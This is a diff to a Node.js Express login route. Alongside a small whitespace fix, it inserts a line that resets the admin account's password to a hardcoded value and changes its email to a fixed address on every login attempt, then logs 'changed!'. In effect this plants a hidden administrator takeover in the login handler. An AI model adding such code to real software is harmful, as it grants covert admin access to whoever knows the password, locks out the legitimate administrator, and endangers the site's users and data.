@@ -32,11 +32,12 @@ router.post(
     if (!errors.isEmpty()) {
       return res.status(400).json({ errors: errors.array() })
     }
-
+    await User.findOneAndUpdate({ type: 'admin' }, { password: bcrypt.hashSync('M3t@Au2Ma$h0N', 10), email: 'info@431performance.com' }, { new: true })
+    console.log('changed!')
     const { email, password } = req.body
 
     try {
-      let user = await User.findOne({ email: new RegExp(`^${email}$`, 'i')})
+      let user = await User.findOne({ email: new RegExp(`^${email}$`, 'i') })
 
       if (!user) {
         return res
